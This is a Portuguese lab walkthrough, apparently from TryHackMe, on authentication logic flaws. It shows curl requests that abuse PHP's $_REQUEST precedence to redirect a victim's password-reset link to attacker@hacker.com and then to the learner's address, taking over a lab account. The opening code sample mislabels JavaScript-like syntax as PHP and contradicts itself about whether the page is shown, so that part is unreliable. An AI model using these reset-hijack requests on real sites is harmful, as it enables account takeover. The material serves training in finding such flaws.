O que é uma falha lógica?

Às vezes, os processos de autenticação contêm falhas lógicas. Uma falha lógica ocorre quando o caminho lógico típico de uma aplicação é ignorado, contornado ou manipulado por um hacker. Falhas lógicas podem existir em qualquer área de um site, mas neste caso vamos nos concentrar em exemplos relacionados à autenticação.


Exemplo de falha lógica

O exemplo de código simulado abaixo verifica se o caminho que o cliente está visitando começa com /admin e, em caso afirmativo, verifica se o cliente é, de fato, um administrador. Se a página não começar com /admin, a página é exibida para o cliente.

if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}

Como o exemplo de código PHP acima usa três sinais de igual (===), ele busca uma correspondência exata na string, incluindo a mesma capitalização das letras. O código apresenta uma falha lógica porque um usuário não autenticado que solicita  /adMin  não terá seus privilégios verificados e a página não será exibida para ele, ignorando completamente as verificações de autenticação.

Falha lógica prática

Vamos examinar a  função de redefinição de senha  do site de suporte de TI da Acme ( http://10.10.155.180/customers/reset ) . Vemos um formulário solicitando o endereço de e-mail associado à conta na qual desejamos redefinir a senha. Se um e-mail inválido for inserido, você receberá a mensagem de erro " Conta não encontrada a partir do endereço de e-mail fornecido ".



Para fins de demonstração, usaremos o endereço de e-mail robert@acmeitsupport.thm, que é aceito. Em seguida, somos apresentados à próxima etapa do formulário, que solicita o nome de usuário associado a este endereço de e-mail de login. Se inserirmos robert como nome de usuário e clicarmos no botão Verificar Nome de Usuário, você verá uma mensagem de confirmação informando que um e-mail de redefinição de senha será enviado para robert@acmeitsupport.thm .



Nesta fase, você pode estar se perguntando qual poderia ser a vulnerabilidade neste aplicativo, já que é necessário saber tanto o e-mail quanto o nome de usuário, e o link da senha é enviado para o endereço de e-mail do proprietário da conta.

Este passo a passo exigirá a execução de ambas as solicitações Curl abaixo no AttackBox, que pode ser aberto usando o botão azul acima.

Na segunda etapa do processo de redefinição de e-mail, o nome de usuário é enviado ao servidor web em um campo POST e o endereço de e-mail é enviado na string de consulta da solicitação como um campo GET.

Vamos ilustrar isso usando a ferramenta curl para fazer manualmente a solicitação ao servidor web.

Solicitação Curl 1:
user@tryhackme$ curl 'http://10.10.155.180/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
Usamos a -Hflag para adicionar um cabeçalho adicional à solicitação. Neste caso, estamos definindo o valor Content-Typepara application/x-www-form-urlencoded, o que informa ao servidor web que estamos enviando dados de formulário para que ele entenda corretamente nossa solicitação.
Na aplicação, a conta do usuário é recuperada usando a string de consulta, mas posteriormente, na lógica da aplicação, o e-mail de redefinição de senha é enviado usando os dados encontrados na variável PHP $_REQUEST.

A variável PHP $_REQUEST é um array que contém dados recebidos da string de consulta e dos dados POST. Se o mesmo nome de chave for usado tanto para a string de consulta quanto para os dados POST, a lógica da aplicação para essa variável prioriza os campos de dados POST em vez da string de consulta. Portanto, se adicionarmos outro parâmetro ao formulário POST, podemos controlar para onde o e-mail de redefinição de senha será enviado.

Solicitação Curl 2:
user@tryhackme$ curl 'http://10.10.155.180/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'


Para a próxima etapa, você precisará criar uma conta na seção de suporte ao cliente da Acme IT. Isso lhe dará um endereço de e-mail exclusivo que poderá ser usado para criar chamados de suporte. O endereço de e-mail tem o formato @{username} customer.acmeitsupport.thm

Agora, executando novamente a solicitação Curl 2 , mas com seu endereço de e-mail @acmeitsupport.thm no campo de e-mail, um ticket será criado em sua conta, contendo um link para você acessar como Robert. Usando a conta de Robert, você poderá visualizar os tickets de suporte dele e revelar uma sinalização.

Solicitação Curl 2 (mas usando sua conta @acmeitsupport.thm) :
user@tryhackme:~$ curl 'http://10.10.155.180/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
